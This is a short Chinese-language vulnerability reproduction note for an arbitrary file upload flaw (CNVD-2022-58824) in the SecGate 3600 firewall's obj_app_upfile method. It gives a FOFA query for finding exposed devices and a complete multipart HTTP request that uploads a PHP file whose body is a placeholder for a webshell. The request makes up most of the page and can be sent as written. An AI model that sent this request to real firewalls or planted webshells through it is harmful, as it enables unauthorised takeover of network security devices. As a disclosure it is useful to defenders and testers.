# 网神SecGate 3600防火墙 obj_app_upfile 任意文件上传漏洞

## 漏洞描述

网神SecGate 3600防火墙obj_app_upfile方法存在任意文件上传漏洞

## 漏洞影响

```
2016年以前的版本 CNVD-2022-58824
```

## FOFA

```
title="SecGate 3600" or "SecGate 3600"
```

## 漏洞复现

登陆页面

![image-20230811114306644](img/image-20230811114306644.png)

验证POC,根目录下变量g用于接收方法名。而upfile方法中不会对文件进行校验，只需构造multipart即可

```
POST /?g=obj_app_upfile HTTP/1.1
Host: x.x.x.x
Accept: */*
Accept-Encoding: gzip, deflate
Content-Length: 574
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="MAX_FILE_SIZE"

10000000
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="upfile"; filename="vulntest.php"
Content-Type: text/plain

<?php php马?>

------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="submit_post"

obj_app_upfile
------WebKitFormBoundaryJpMyThWnAxbcBBQc
Content-Disposition: form-data; name="__hash__"

0b9d6b1ab7479ab69d9f71b05e0e9445
------WebKitFormBoundaryJpMyThWnAxbcBBQc--
```



